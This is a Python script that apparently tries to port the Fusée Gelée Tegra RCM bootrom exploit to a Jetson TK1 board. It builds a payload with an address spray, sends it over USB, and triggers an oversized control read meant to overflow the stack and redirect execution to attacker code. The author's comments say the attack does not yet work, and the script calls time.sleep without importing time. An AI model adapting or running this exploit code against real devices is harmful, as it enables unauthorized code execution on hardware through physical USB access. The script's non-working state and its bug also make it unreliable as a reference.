#!/usr/bin/env python3

# Testing fusee geelee exploit on t124 jetson tk1 board
# At this moment it doenst look to work.

# Thanks to fail0verflow and Katherine Temkin for the original
# info / code.

import usb.util
import binascii
import struct

def parse32(buf, offset):
    return struct.unpack('<L', buf[offset:offset+4])[0]

def wait_for_device(dev_id):
    dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    while dev is None:
        time.sleep(0.1)
        dev = usb.core.find(idVendor=dev_id[0], idProduct=dev_id[1])
    return dev

class RCM:
    DEV_ID_JETSON_TK1 = (0x0955, 0x7140)
    EP1_OUT = usb.util.ENDPOINT_OUT | 1
    EP1_IN = usb.util.ENDPOINT_IN | 1

    def __init__(s):
        s.dev = wait_for_device(s.DEV_ID_JETSON_TK1)

    def ep1_read(s, size): return s.dev.read(s.EP1_IN, size)

    def ep1_write(s, size): return s.dev.write(s.EP1_OUT, size)

    def read_init_msg(s):
        # rcm_send_chip_id_and_version
        try:
            return s.ep1_read(0x10)
        except:
            return b''

    def ep0_read(s, size):
        return s.dev.ctrl_transfer(0x82, 0, 0, 0, size)

    def ep0_read_unbounded(s, size):
        try:
            ret = s.dev.ctrl_transfer(0x82, 0, 0, 0, size)
            print(binascii.hexlify(ret))
            print("no timeout.. this doesnt seem right!")
        except usb.core.USBError:
            print("timeout.. good!")

    def sanity_check(s, src_base, dst_base):
        # check the stack and buffers look as expected
        buf = s.ep0_read(0x1000)
        cur_src = parse32(buf, 0xc)
        cur_dst = parse32(buf, 0x14)
        assert cur_src == src_base and cur_dst == dst_base

    def pwn(s):

        # this is sp+0xC
        src_base = 0x4000DCF4
        # memcpy pushes r4,lr
        # memcpy_wrapper pushes r0,lr
        target = src_base + 0xC + 2 * 4 + 2 * 4
        
        dst_base0 = 0x40004000
        dst_base1 = 0x40008000
        payload_base = 0x4000e000|1 # |1 thumb bit for bx 

        overwrite_len = target - dst_base1

        # TODO: Trying to break execution flow using max get status lengh.
        # after several trials I cannot see the stack getting smashed
        # I would expet that if this happens, then I would not be able
        # to send valid get status any more but this doenst looks to
        # work.
        overwrite_len = 0xFFFC

        # rom is in rcm_send_chip_id_and_version... unblock it
        init_msg = s.read_init_msg()
        print(binascii.hexlify(init_msg))

        # The RCM CMD looks a litte bit different from the used on X1, as described on tegrarcm.
        # Size restrictions are not the same neither the format.
        # lenght RCM CMD 0x021964
        payload = struct.pack('<L', 0x00021964) + b'\0' * 0x280

        # build payload
        # TODO: At this point the stack doesnt look to get smashed, so dont care about this :(
        with open('reset_example.bin', "rb") as f:
            payload += f.read()

        spray_size = overwrite_len / 4;
        payload += struct.pack('<L', payload_base) * int(spray_size);

        # Pad the payload to fill a USB request exactly, so we don't send a short
        # packet and break out of the RCM loop.
        payload_length = len(payload)
        padding_size   = 0x1000 - (payload_length % 0x1000)
        payload += (b'\0' * padding_size)

        # xfer payload
        xfer_len = 0x1000
        for i in range(0, len(payload), xfer_len):
            s.ep1_write(payload[i:i+xfer_len])
        try:
            s.sanity_check( src_base, dst_base1 )
        except:
            print('throwing more')
            s.ep1_write( b'\0' * xfer_len )
            s.sanity_check( src_base, dst_base1 )


        # Trigger stack overwrite from the payload buf (accessed by reading off the end of rcm_xfer_buffers[1])
        print( "Performing hax..." )
        s.ep0_read_unbounded(overwrite_len)
        
        # TODO: THIS SHOULD FAIL but it doesn't
        s.ep0_read_unbounded(0x1000)

rcm = RCM()
rcm.pwn()

